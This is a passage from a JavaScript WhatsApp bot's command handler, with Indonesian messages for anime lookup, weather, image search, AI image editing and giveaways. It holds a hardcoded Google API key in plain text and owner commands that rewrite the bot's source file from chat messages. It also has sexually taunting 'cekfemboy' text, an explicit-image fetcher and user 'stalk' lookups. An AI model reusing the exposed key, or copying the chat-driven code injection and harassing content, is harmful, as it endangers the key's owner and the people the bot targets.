  teks += `*Judul Jepang:* ${result.title_japanese || '-'}\n`
  teks += `*Tipe:* ${result.type || '-'}\n`
  teks += `*Episode:* ${result.episodes || '-'}\n`
  teks += `*Status:* ${result.status || '-'}\n`
  teks += `*Tanggal Tayang:* ${result.aired?.string || '-'}\n`
  teks += `*Skor:* ${result.score || '-'}\n`
  teks += `*Produser:* ${(result.producers?.map(p => p.name).join(', ')) || '-'}\n`
  teks += `*Studio:* ${(result.studios?.map(s => s.name).join(', ')) || '-'}\n`
  teks += `*Genre:* ${(result.genres?.map(g => g.name).join(', ')) || '-'}\n`
  teks += `*Durasi:* ${result.duration || '-'}\n`
  teks += `*Rating:* ${result.rating || '-'}\n`
  teks += `\n*Sinopsis:* ${result.synopsis || '-'}\n`
  teks += `\n*Link:* ${result.url}`
  conn.sendMessage(m.chat, {
    image: { url: result.images.jpg.image_url },
    caption: teks
  }, { quoted: m })
}
break		
case 'getcase': {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return m.reply('Harap masukkan nama case yang ingin dicari! 🧐');
    try {
        const caseName = text.replace(/^['"]|['"]$/g, '');
        const getCase = (cases) => {
            const fileContent = fs.readFileSync("./biyu.js", "utf-8");
            const caseBlock = fileContent.split(`case '${cases}'`)[1];
            if (!caseBlock) throw new Error('Case not found');
            return `case '${cases}'` + caseBlock.split("break")[0] + "break";
        }
        m.reply(`${getCase(caseName)}`);
    } catch (err) {
        m.reply(`Case '${text}' tidak ditemukan! 🚫`);
    }
}
break
case 'setcase': {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Format: setcase namacase { kode baru } break;')
    const fs = require('fs'), path = require('path'), namaFile = path.join(__dirname, 'biyu.js')
    const caseMatch = text.match(/^(\S+)\s*({[\s\S]*?break;)\s*$/i)
    if (!caseMatch) return m.reply('Format salah! Contoh: setcase namacase { kode baru } break;')
    const caseName = caseMatch[1].replace(/['"`]/g, ''), newCaseContent = `case '${caseName}': ${caseMatch[2]}\n`
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) return m.reply(`Gagal baca file: ${err.message}`)
        const casePattern = new RegExp(`case\\s+['"\`]${caseName}['"\`]:\\s*\\{[\\s\\S]*?break;\\s*\\}\\s*`, 'g')
        if (!casePattern.test(data)) return m.reply(`Case "${caseName}" tidak ditemukan`)
        fs.writeFile(namaFile, data.replace(casePattern, newCaseContent), 'utf8', (err) => {
            if (err) return m.reply(`Gagal tulis file: ${err.message}`)
            m.reply(`Case "${caseName}" berhasil diperbarui!`)
        })
    })
    }
    break

case 'findcase': {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return m.reply('Harap masukkan kata kunci pencarian case! 🔍')
    try {
        const fileContent = fs.readFileSync("./biyu.js", "utf-8"), caseBlocks = fileContent.split(/case\s+['"`]([^'"`]+)['"`]/g)
        if (caseBlocks.length < 2) throw new Error('No cases found')
        let foundCases = []
        for (let i = 1; i < caseBlocks.length; i += 2) {
            const caseName = caseBlocks[i]
            if (caseName.toLowerCase().includes(text.toLowerCase())) {
                const caseContent = caseBlocks[i+1].split("break")[0]
                foundCases.push({ name: caseName, content: `case '${caseName}'${caseContent}break` })
            }
        }
        if (foundCases.length === 0) return m.reply(`Tidak ditemukan case yang mengandung "${text}"`)
        let replyText = `Ditemukan ${foundCases.length} case yang mengandung "${text}":\n\n`
        foundCases.forEach((c, i) => replyText += `*${i+1}. ${c.name}*\n${c.content}\n\n`)
        if (replyText.length > 1000) {
            const parts = []
            while (replyText.length > 0) { parts.push(replyText.substring(0, 1000)); replyText = replyText.substring(1000) }
            parts.forEach(part => m.reply(part))
        } else m.reply(replyText)
    } catch (err) { m.reply(`Gagal mencari case: ${err.message}`) }
    }
    break
	
case 'addcase': {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply('Add the case you want to include');
  const NAMA_FILE = './biyu.js';
  const caseBaru = text;
  try {
    fs.readFile(NAMA_FILE, 'utf8', (err, data) => {
      if (err) throw err;
      const posisiAwalGimage = data.indexOf("case 'addcase':");
      if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(NAMA_FILE, kodeBaruLengkap, 'utf8', (err) => {
          if (err) {
            m.reply('Error File:', err);
          } else {
            m.reply('Success Adding case');
          }
        });
      } else {
        m.reply('Failed to add case');
      }
    });
  } catch (err) {
    console.error('An error occurred while reading the file:', err);
    return;
  }
}
break
case 'cekfemboy': {
    if (!text) return m.reply('Masukin nama dulu, biar bisa gue nilai... seberapa layak lo dibisik "malam ini kamu punyaku ya~".');

    let target = text || m.pushName;

    const hash = Array.from(target).reduce((acc, char) => acc + char.charCodeAt(0), 0);
    const percent = Math.floor((hash * Date.now()) % 101);

    let rank = '';
    if (percent >= 95) {
        rank = 'UKE LEGENDARIS';
    } else if (percent >= 85) {
        rank = 'FEMBOY HOTLINE';
    } else if (percent >= 70) {
        rank = 'FEMBOY SIAGA 1';
    } else if (percent >= 50) {
        rank = 'FEMBOY NGEFLIRT';
    } else if (percent >= 30) {
        rank = 'FEMBOY TERPENDAM';
    } else {
        rank = 'TARGET FANTASI';
    }

    let komentar = '';
    if (percent >= 95) {
        komentar = 'Lo tuh femboy idaman sugar daddy. Dikit aja dikasih perhatian, langsung manja-manja sambil meringkuk di dada orang. Suara lo? ASMR-nya ngegoda setengah mati.';
    } else if (percent >= 85) {
        komentar = 'Dari cara lo ngetik aja udah kebaca: lo suka dipeluk dari belakang sambil dibisikin pelan. "Udah siap buat nakal belum?" dan lo cuma bisa ngangguk pelan.';
    } else if (percent >= 70) {
        komentar = 'Lo bukan cuma femboy... lo tuh pemicu dosa. Outfit lo selalu kebetulan *nempel banget*. Bikin yang lihat pengen langsung tarik dan bilang "ayo, kamar kosong ada nih."';
    } else if (percent >= 50) {
        komentar = 'Lo diem-diem horny. Di luar keliatan kalem, tapi pas malem sendirian, lo buka headset, pasang playlist "moan compilation", dan... ya, lo ngerti sendiri lanjutannya.';
    } else if (percent >= 30) {
        komentar = 'Aura lo tuh "aku malu, tapi mau". Sering banget dikira polos, padahal tab bookmark lo isinya *doujin* dan video-videonya full dengan tag yang... gak bisa dijelasin di sini.';
    } else {
        komentar = 'Lo bukan femboy. Tapi lo punya muka yang sering jadi thumbnail video "cowok straight dibikin leleh sama trap". Dan lo nonton... sampe habis. Diam-diam ngulang 3x.';
    }

    const notes = [
        'Note: Stop nyari "femboy gets bred" di search bar, lo ketauan.',
        'Note: Lo tuh bukan innocent, lo cuman belum ke-ekspos aja.',
        'Note: Lo suka bilang "iya kak..." pas voice? Jangan sok malu deh.',
        'Note: History lo isinya lebih orno dari VPN premium.',
        'Note: Lo udah bukan wibu biasa, lo tuh femboy enjoyer tingkat advance.',
        'Note: Kalau explore IG lo isinya cowok berseragam ketat... lo udah tau lah.',
    ];

    const pickNote = notes[Math.floor(Math.random() * notes.length)];

    m.reply(`👤 *${target}*\n🏅 *RANK:* ${rank}\n🔞 *${percent}% Femboy Power*\n\n${komentar}\n\n${pickNote}`);
}
break

 case 'islamai': case 'aiislam': {
 if (!text) return m.reply("Masukkan pertanyaan yang ingin ditanyakan!");
 try {
 await conn.sendMessage(m.chat, {
 react: {
 text: "⏱️",
 key: m.key,
 }
 });
const axios = require("axios");
 let { data } = await axios.get(`https://bk9.fun/ai/Islam-ai?q=${encodeURIComponent(text)}`);
 if (!data.status || !data.BK9 || !data.BK9.result) {
 return m.reply("Gagal mendapatkan jawaban dari Islam AI.");
 }
 let caption = `🕌 *Islam AI Response*\n\n📜 *Pertanyaan:* ${text}\n\n📝 *Jawaban:*\n${data.BK9.result}`;
 await conn.sendMessage(m.chat, { text: caption }, { quoted: m });
 await conn.sendMessage(m.chat, {
 react: {
 text: "✅",
 key: m.key,
 }
 });
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat menghubungi AI.");
 }
};
break
 
case 'delcase': {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply('Masukkan nama case yang ingin dihapus')
  const NAMA_FILE = './biyu.js';
  const namaCase = text;
  try {
    fs.readFile(NAMA_FILE, 'utf8', (err, data) => {
      if (err) throw err;
      const posisiAwalGimage = data.indexOf(`case '${namaCase}':`);
      if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage);
        const kodeBaruLengkap2 = data.slice(posisiAwalGimage);
        const kodeBaruLengkap3 = kodeBaruLengkap2.split('\n');
        const kodeBaruLengkap4 = kodeBaruLengkap3.slice(1).join('\n');
        const kodeBaruLengkap5 = kodeBaruLengkap + '\n' + kodeBaruLengkap4;
        fs.writeFile(NAMA_FILE, kodeBaruLengkap5, 'utf8', (err) => {
          if (err) {
            m.reply('Error File:', err);
          } else {
            m.reply('Success Delete case');
          }
        });
      } else {
        m.reply('Failed to delete case');
      }
    });
  } catch (err) {
    console.error('An error occurred while reading the file:', err);
    return;
  }
}
break

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
await m.reply(`${res.id}`)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break
case 'ytstalk3': case 'stalkyt3': {
  if (!text) return m.reply('Masukkan username YouTube!\nContoh: ytstalk BiyuOffc')

  let res = await fetch(`https://www.velyn.biz.id/api/stalk/youtubestalk?username=${encodeURIComponent(text)}`)
  let json = await res.json()
  if (!json.status) return m.reply('Gagal mengambil data.')
  let { channelMetadata, videoDataList } = json.data
  let teks = `*YOUTUBE STALK*\n`
  teks += `*Username:* ${channelMetadata.username}\n`
  teks += `*Subscriber:* ${channelMetadata.subscriberCount}\n`
  teks += `*Link Channel:* ${channelMetadata.channelUrl}\n`
  teks += `*Deskripsi:* ${channelMetadata.description || '-'}\n\n`
  teks += `*Video Terbaru:*\n`
  for (let vid of videoDataList) {
    teks += `• *${vid.title}*\n`
    teks += `Durasi: ${vid.duration}\n`
    teks += `Upload: ${vid.publishedTime}\n`
    teks += `Views: ${vid.viewCount}\n`
    teks += `https://youtube.com${vid.navigationUrl}\n\n`
  }

  conn.sendMessage(m.chat, {
    image: { url: channelMetadata.avatarUrl },
    caption: teks,
    contextInfo: {
      externalAdReply: {
        title: channelMetadata.username,
        body: channelMetadata.subscriberCount,
        thumbnailUrl: channelMetadata.avatarUrl,
        sourceUrl: channelMetadata.channelUrl,
        mediaType: 1,
        renderLargerThumbnail: true,
        showAdAttribution: true
      }
    }
  }, { quoted: m })
}
break
case 'aiedit': case 'editai': {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 if (!text) {
 return m.reply("Harap masukkan prompt custom!\n\nContoh: aiedit buatkan foto itu lebih estetik.");
 }
 if (!mime) {
 return m.reply("Tidak ada gambar yang direply! Silakan reply gambar dengan format jpg/png.");
 }
 if (!/image\/(jpe?g|png)/.test(mime)) {
 return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png.`);
 }
 m.reply("Otw diedit sesuai permintaan...");
 try {
 let imgData = await q.download();
 let genAI = new GoogleGenerativeAI("AIzaSyB8T-3WnKqDbK3GSYYUtTiyDfIV-vBxoPw");
 const base64Image = imgData.toString("base64");
 const contents = [
 { text: text }, 
 {
 inlineData: {
 mimeType: mime,
 data: base64Image
 }
 }
 ];
 const model = genAI.getGenerativeModel({
 model: "gemini-2.0-flash-exp-image-generation",
 generationConfig: {
 responseModalities: ["Text", "Image"]
 },
 });
 const response = await model.generateContent(contents);
 let resultImage;
 let resultText = "";
 for (const part of response.response.candidates[0].content.parts) {
 if (part.text) {
 resultText += part.text;
 } else if (part.inlineData) {
 const imageData = part.inlineData.data;
 resultImage = Buffer.from(imageData, "base64");
 }
 }
 if (resultImage) {
 const tmpDir = path.join(process.cwd(), "tmp");
 if (!fs.existsSync(tmpDir)) {
 fs.mkdirSync(tmpDir, { recursive: true });
 }
 let tempPath = path.join(tmpDir, `gemini_${Date.now()}.png`);
 fs.writeFileSync(tempPath, resultImage);
 await conn.sendMessage(m.chat, { 
 image: { url: tempPath },
 caption: `*Edit selesai sesuai permintaan!*`
 }, { quoted: m });
 setTimeout(() => {
 try {
 fs.unlinkSync(tempPath);
 } catch (err) {
 console.error("Gagal menghapus file sementara:", err);
 }
 }, 30000);
 } else {
 m.reply("Gagal memproses gambar.");
 }
 } catch (error) {
 console.error(error);
 m.reply(`Error: ${error.message}`);
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'sanime':
case 'searchanime':
case 'kuronime': {
  if (!q) return m.reply('🔎 *Silakan masukkan judul anime yang ingin kamu cari.*')

  try {
    const axios = require("axios")
    const cheerio = require("cheerio")
    const url = `https://kuronime.biz/page/1/?s=${encodeURIComponent(q)}`
    const { data } = await axios.get(url)
    const $ = cheerio.load(data)
    const results = []
    $(".listupd article").each((_, el) => {
      const anchor = $(el).find("a")
      const title = anchor.find("h4").text().trim()
      const link = anchor.attr("href")
      const image = anchor.find("img.lazyload").last().attr("data-src")
      const rating = anchor.find("i").text().trim()
      const type = anchor.find(".type").text().trim()
      results.push({ title, link, image, rating, type })
    })
    if (!results.length) return m.reply('Anime tidak ditemukan, coba kata kunci lain.')
    let message = `Hasil pencarian untuk *${q}*:\n\n`
    results.forEach((anime, index) => {
      message += `*${index + 1}. ${anime.title}*\n`
      message += `   🔗 *Link*: ${anime.link}\n`
      message += `   📊 *Rating*: ${anime.rating}\n`
      message += `   📌 *Type*: ${anime.type}\n\n`
    })
    conn.sendMessage(m.chat, {
      text: message.trim(),
      contextInfo: {
        externalAdReply: {
          title: "Kuronime Search",
          body: "",
          thumbnailUrl: results[0]?.image || '',
          sourceUrl: results[0]?.link || '',
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    }, { quoted: m })
  } catch (err) {
    console.log(err)
    m.reply(`Terjadi kesalahan saat mengambil data: ${err.message}`)
  }
}
break
case 'cekcuaca': case 'cuaca': {
  if (!q) return m.reply('Masukkan nama lokasi!\nContoh: cekcuaca Jakarta');
  let lokasi = encodeURIComponent(q);
  let url = `https://fastrestapis.fasturl.cloud/search/bmkgweather?location=${lokasi}`;

  try {
    let res = await fetch(url);
    let json = await res.json();
    if (json.status !== 200 || json.content !== 'Success') {
      return m.reply('Gagal mengambil data cuaca!');
    }
    let cuaca = json.result.presentWeather.data.cuaca;
    let lokasiInfo = json.result.presentWeather.data.lokasi;
    let hasil = `*Cuaca Saat Ini - ${lokasiInfo.kotkab}, ${lokasiInfo.provinsi}*\n\n` +
      `• Lokasi: ${lokasiInfo.desa}, ${lokasiInfo.kecamatan}\n` +
      `• Cuaca: ${cuaca.weather_desc}\n` +
      `• Suhu: ${cuaca.t}°C\n` +
      `• Kelembapan: ${cuaca.hu}%\n` +
      `• Arah Angin: ${cuaca.wd} → ${cuaca.wd_to} (${cuaca.ws} km/jam)\n` +
      `• Jarak Pandang: ${cuaca.vs_text}\n` +
      `• Terakhir diperbarui: ${cuaca.local_datetime}\n`;

    await conn.sendMessage(m.chat, {
      image: { url: cuaca.image },
      caption: hasil
    }, { quoted: m });
  } catch (e) {
    console.log(e);
    m.reply('Terjadi kesalahan saat mengambil data cuaca.');
  }
  }
  break
case 'pindl':
case 'pinterestdown':
case 'downpin': {
  if (!q) return m.reply(`
- Pinterestdown Downloader Sigma 🤭

Example Penggunaan:
- ${prefix + command} Urlmu
> Jangan Dispam, Karena make limit :v
  `);

  try {
    m.reply('❗Proses...');
    const result = await dlPin(q);
    if (result.direct_mp4) {
      await conn.sendMessage(from, {
        video: { url: result.direct_mp4 },
        caption: `- *${result.headline}*\n• 👤 ${result.profile_name}\n• ❤️ ${result.likes} Likes`
      }, { quoted: m });
    } else if (result.image.includes('.gif')) {
      await conn.sendMessage(from, {
        video: { url: result.image },
        caption: `- *${result.headline}*\n• 👤 ${result.profile_name}\n• ❤️ ${result.likes} Likes`
      }, { quoted: m });
    } else {
      await conn.sendMessage(from, {
        image: { url: result.image },
        caption: `- *${result.headline}*\n• 👤 ${result.profile_name}\n• ❤️ ${result.likes} Likes`
      }, { quoted: m });
    }
  } catch (e) {
    m.reply(`Gagal mengunduh!\n${e.message}`);
  }
}
break
case 'pin' :
case 'pinterest': {
const axios = require('axios')
const https = require('https')

const agent = new https.Agent({
 rejectUnauthorized: true,
 maxVersion: 'TLSv1.3',
 minVersion: 'TLSv1.2'
});

async function getCookies() {
 try {
 const response = await axios.get('https://www.pinterest.com/csrf_error/', { httpsAgent: agent });
 const setCookieHeaders = response.headers['set-cookie'];
 if (setCookieHeaders) {
 const cookies = setCookieHeaders.map(cookieString => {
 const cookieParts = cookieString.split(';');
 return cookieParts[0].trim();
 });
 return cookies.join('; ');
 }
 return null;
 } catch {
 return null;
 }
}

async function pinterest(query) {
 try {
 const cookies = await getCookies();
 if (!cookies) return [];

 const url = 'https://www.pinterest.com/resource/BaseSearchResource/get/';
 const params = {
 source_url: `/search/pins/?q=${query}`,
 data: JSON.stringify({
 options: {
 isPrefetch: false,
 query: query,
 scope: "pins",
 no_fetch_context_on_resource: false
 },
 context: {}
 }),
 _: Date.now()
 };

 const headers = {
 'accept': 'application/json, text/javascript, */*, q=0.01',
 'accept-encoding': 'gzip, deflate',
 'accept-language': 'en-US,en;q=0.9',
 'cookie': cookies,
 'dnt': '1',
 'referer': 'https://www.pinterest.com/',
 'sec-ch-ua': '"Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
 'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Microsoft Edge";v="133.0.3065.92", "Chromium";v="133.0.6943.142"',
 'sec-ch-ua-mobile': '?0',
 'sec-ch-ua-model': '""',
 'sec-ch-ua-platform': '"Windows"',
 'sec-ch-ua-platform-version': '"10.0.0"',
 'sec-fetch-dest': 'empty',
 'sec-fetch-mode': 'cors',
 'sec-fetch-site': 'same-origin',
 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
 'x-app-version': 'c056fb7',
 'x-pinterest-appstate': 'active',
 'x-pinterest-pws-handler': 'www/[username]/[slug].js',
 'x-pinterest-source-url': '/hargr003/cat-pictures/',
 'x-requested-with': 'XMLHttpRequest'
 };

 const { data } = await axios.get(url, { httpsAgent: agent, headers, params });
 return data.resource_response.data.results
 .filter(v => v.images?.orig)
 .map(result => ({
 upload_by: result.pinner.username,
 fullname: result.pinner.full_name,
 followers: result.pinner.follower_count,
 caption: result.grid_title,
 image: result.images.orig.url,
 source: "https://id.pinterest.com/pin/" + result.id,
 }));
 } catch {
 return [];
 }
}

 if (!text) return m.reply(`*Penggunaan:* ${prefix + command} <query> <jumlah>\n\n*Contoh:* ${prefix + command} anime 3`);
 
 let [query, count] = text.split(' ');
 let imgCount = 5;

 if (text.indexOf(' ') !== -1) {
 const lastWord = text.split(' ').pop();
 if (!isNaN(lastWord) && lastWord.trim() !== '') {
 imgCount = parseInt(lastWord);
 query = text.substring(0, text.lastIndexOf(' '));
 } else {
 query = text;
 }
 } else {
 query = text;
 }
 
 m.reply('Searching Pinterest images...');
 
 try {
 const results = await pinterest(query);
 if (results.length === 0) return reply(`No results found for "${query}". Try another search term.`);
 
 const imagesToSend = Math.min(results.length, imgCount);
 m.reply(`Sending ${imagesToSend} Pinterest images for "${query}"...`);
 
 for (let i = 0; i < imagesToSend; i++) {
 await conn.sendMessage(m.chat, { image: { url: results[i].image } });
 }
 } catch {
 m.reply('Error occurred while fetching Pinterest images. Please try again later.');
 }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "meme":
case "searchmeme":
case "soundmeme": {
 if (!q) return m.reply("Masukkan kata kunci meme dan max hasil pencarian!\nContoh: meme wibu 2");
 let argsz = q.split(" ");
 let limit = parseInt(argsz[argsz.length - 1]); 
 let searchQuery = isNaN(limit) ? q : argsz.slice(0, -1).join(" "); 
 let url = `https://api.agungny.my.id/api/memesound?q=${encodeURIComponent(searchQuery)}`;
 try {
 let res = await fetch(url);
 let json = await res.json();
 if (!json.status || !json.result.length) return reply("Meme tidak ditemukan!");
 let results = isNaN(limit) ? json.result : json.result.slice(0, limit);
 let message = "🎵 *Hasil Pencarian:*\n\n";
 for (let i = 0; i < results.length; i++) {
 message += `🎶 *${results[i].text}*\n🔗 (${results[i].url})\n\n`;
 await conn.sendMessage(from, { audio: { url: results[i].audioUrl }, mimetype: "audio/mpeg" });
 }
 m.reply(message);
 } catch (err) {
 console.error(err);
 m.reply("Terjadi kesalahan saat mencari meme. [ Meme tidak ditemukan ]");
 }
}
break

case "gimage2":
case "simg2":
case "searchimage2":
  {
    if (!text) return m.reply('Masukkan kata kunci pencarian!')
    await conn.sendMessage(m.chat, { react: { text: '🔍', key: m.key } })
    try {
      let response = await fetchJson(`https://api.siputzx.my.id/api/images?query=${text}`)
      
      if (!response.status) return m.reply("Error: API response status not OK")
      
      let aray = response.data || []
      
      if (aray.length === 0) {
        return m.reply("Tidak ada hasil gambar yang ditemukan")
      }
      
      aray = aray.slice(0, 20) 
      await m.reply(`🔎 *Hasil Pencarian Foto untuk:* _${text}_`)
      let cards = []
      let total = 0
      
      for (let i of aray) {
        try {
          if (!i.url) {
            console.log('Image URL not found in data item:', i)
            continue
          }
          
          let imageUrl = i.url
          let imgsc = await prepareWAMessageMedia({ image: { url: imageUrl } }, { upload: conn.waUploadToServer })
          cards.push({
            header: proto.Message.InteractiveMessage.Header.fromObject({
              title: `Foto Ke ${++total}`,
              hasMediaAttachment: true,
              ...imgsc
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
              buttons: [
                {
                  name: "cta_copy",
                  buttonParamsJson: `{ "display_text": "Salin Link", "copy_text": "${imageUrl}" }`
                }
              ]
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: `🔗 ${imageUrl}`
            })
          })
        } catch (err) {
          console.error(`Error processing image:`, err)
        }
      }
      
      if (cards.length === 0) {
        return m.reply('Tidak dapat memproses gambar, coba kata kunci lain!')
      }
      
      const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: cards
              })
            })
          }
        }
      }, {
        userJid: m.sender,
        quoted: m
      })
      
      conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
      await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
    } catch (error) {
      console.error('Main error:', error)
      return m.reply('Terjadi kesalahan saat mencari foto! Coba lagi nanti.')
    }
  }
  break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'telegram': case 'tele': case 'telestalk': {
  if (!q) return m.reply(`Masukkan usernamenya!\nContoh: ${prefix + command} BiyuOffc`)
  try {
    const res = await fetch(`https://www.velyn.biz.id/api/stalk/telegramstalk?username=${q}`)
    const json = await res.json()
    if (!json.status) return m.reply('Username tidak ditemukan!')
    const { title, description, url, image_url } = json.data
    const teks = `*Telegram Info*\n\n*Nama:* ${title}\n*Bio:* ${description}\n*Link:* ${url}`
    conn.sendMessage(m.chat, {
      image: { url: image_url },
      caption: teks
    }, { quoted: m })
  } catch {
    m.reply('Gagal mengambil data.')
  }
}
  break
case 'grok': case "telusuriimg": {
 if (!m.quoted) return m.reply('Harap balas ke foto yang ingin dianalisis + pertanyaaan,gk pke pertanyaan gpp');
 let mime = (m.quoted.msg || m.quoted).mimetype || "";
 if (!mime.startsWith('image/')) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}\n\nExample: grok itu apa dengan reply foto`);
 const axios = require('axios');
 const FormData = require('form-data');
 const { writeFileSync, unlinkSync, createReadStream } = require('fs');
 const path = require('path');
 async function uguu(filePath) {
 try {
 const form = new FormData();
 form.append('files[]', createReadStream(filePath));
 const { data } = await axios.post('https://uguu.se/upload', form, {
 headers: { ...form.getHeaders() }
 });
 return data.files[0].url;
 } catch (err) {
 throw new Error(err.message);
 }
 }
 try {
 await conn.sendMessage(m.chat, { react: { text: '⏱️', key: m.key } });
 let mediaBuffer = await m.quoted.download();
 let ext = mime.split('/')[1] || "png";
 let tempFile = path.join(__dirname, `temp_${Date.now()}.${ext}`);
 writeFileSync(tempFile, mediaBuffer);
 let imageUrl = await uguu(tempFile);
 let pertanyaan = m.text.replace(`${prefix}${command}`, '').trim();
 if (!pertanyaan) return m.reply('Tolong masukkan pertanyaan');
 let sessionId = `${m.chat.replace(/[^a-zA-Z0-9]/g, '')}-${Date.now()}`;
 let apiUrl = `https://fastrestapis.fasturl.cloud/aillm/grok?ask=${encodeURIComponent(pertanyaan)}&imageUrl=${imageUrl}&style=Provide a formal response.&sessionId=${sessionId}`;
 let { data } = await axios.get(apiUrl);
 let result = data.result;

 await conn.sendMessage(m.chat, { text: result }, { quoted: m });
 await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 unlinkSync(tempFile);
 } catch (error) {
 console.error('Error in grok:', error);
 m.reply('Maaf, terjadi kesalahan saat memproses gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.');
 }
}
break

case 'startgiveaway':
case 'mulaigg':
case 'mulaigiveway':
  if (!m.isAdmin && !m.isOwner) return m.reply(mess.admin);
  if (!text) return m.reply('Format salah! Gunakan: .startgiveaway waktu,hadiah,pesan\nContoh: .startgiveaway 24,Diamond Mobile Legends,Giveaway 100 diamond untuk 1 pemenang!');
  const textArgs = text.split(' ');
  const giveawayResult = await startGiveaway(m, textArgs);
  if (giveawayResult !== true) {
    return giveawayResult;
  }
  break
  
case 'ikut':
case 'joingg':
  return ikutGiveaway(m);
  break

case 'cekpeserta':
case 'cekgg':
case 'peserta':
  return cekGiveaway(m);
  break

case 'rollgiveaway':
case 'roll':
case 'pilihpemenang':
  if (!m.isAdmin && !m.isOwner) return m.reply(mess.admin);
  return rollGiveaway(m, []);
  break

case 'hapusgiveaway':
case 'stopgg':
case 'deletegiveaway':
case 'delgg':
  if (!m.isAdmin && !m.isOwner) return m.reply(mess.admin);
  return deleteGiveaway(m);
  break

case 'reloadgiveaway':
case 'reloadgg':
case 'refreshgiveaway':
  if (!m.isAdmin && !m.isOwner) return m.reply(mess.admin);
  return reloadGiveaway(m);
  break
  
case 'infogiveaway':
case 'infogg':
case 'giveawayinfo':
case 'gginfo':
  return infoGiveaway(m);
  break
  
case "reactch":
case "rch": {
    if (!isOwner) return m.reply(msg.owner);
    if (!text) return m.reply("Contoh:\n.reactch https://whatsapp.com/channel/xxx/123 ❤️biyu\n.reactch https://whatsapp.com/channel/xxx/123 ❤️biyu|5");

    const hurufGaya = {
        a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖',
        h: '🅗', i: '🅘', j: '🅙', k: '🅚', l: '🅛', m: '🅜', n: '🅝',
        o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣', u: '🅤',
        v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
        '0': '⓿', '1': '➊', '2': '➋', '3': '➌', '4': '➍',
        '5': '➎', '6': '➏', '7': '➐', '8': '➑', '9': '➒'
    };

    const [mainText, offsetStr] = text.split('|');
    const argsa = mainText.trim().split(" ");
    const link = argsa[0];

    if (!link.includes("https://whatsapp.com/channel/")) {
        return m.reply("Link tidak valid!\nContoh: .reactch https://whatsapp.com/channel/xxx/idpesan ❤️biyu|3");
    }

    const channelId = link.split('/')[4];
    const rawMessageId = parseInt(link.split('/')[5]);
    if (!channelId || isNaN(rawMessageId)) return m.reply("Link tidak lengkap!");
    const offset = parseInt(offsetStr?.trim()) || 1;
    const teksNormal = argsa.slice(1).join(' ');
    const teksTanpaLink = teksNormal.replace(link, '').trim();
    if (!teksTanpaLink) return m.reply("Masukkan teks/emoji untuk direaksikan.");
    const emoji = teksTanpaLink.toLowerCase().split('').map(c => {
        if (c === ' ') return '―';
        return hurufGaya[c] || c;
    }).join('');

    try {
        const metadata = await conn.newsletterMetadata("invite", channelId);
        let success = 0, failed = 0;
        for (let i = 0; i < offset; i++) {
            const msgId = (rawMessageId - i).toString();
            try {
                await conn.newsletterReactMessage(metadata.id, msgId, emoji);
                success++;
            } catch (e) {
                failed++;
            }
        }
        m.reply(`✅ Berhasil kirim reaction *${emoji}* ke ${success} pesan di channel *${metadata.name}*\n❌ Gagal di ${failed} pesan`);
    } catch (err) {
        console.error(err);
        m.reply("❌ Gagal memproses permintaan!");
    }
}
break

case 'pixhentai': case 'pix': {
  if (!q) return m.reply('Masukkan judul yang mau dicari!\nContoh: pixhentai guru');

  let res = await fetch(`https://api.crafters.biz.id/manga/pixhentai?text=${encodeURIComponent(q)}`);
  if (!res.ok) return m.reply('Gagal mengambil data dari API.');
  let json = await res.json();
  if (!json.status || !json.result || !json.result.length) return m.reply('Tidak ditemukan hasil untuk pencarianmu.');
  let hasil = json.result[0]; 
  let teks = `*Judul:* ${hasil.title}\n*Link:* ${hasil.link}\n\nTotal gambar: ${hasil.images.length}`;
  
  await conn.sendMessage(m.chat, {
    image: { url: hasil.thumbnail },
    caption: teks
  }, { quoted: m });
  for (let img of hasil.images) {
    await delay(1000); 
    await conn.sendMessage(m.chat, {
      image: { url: img }
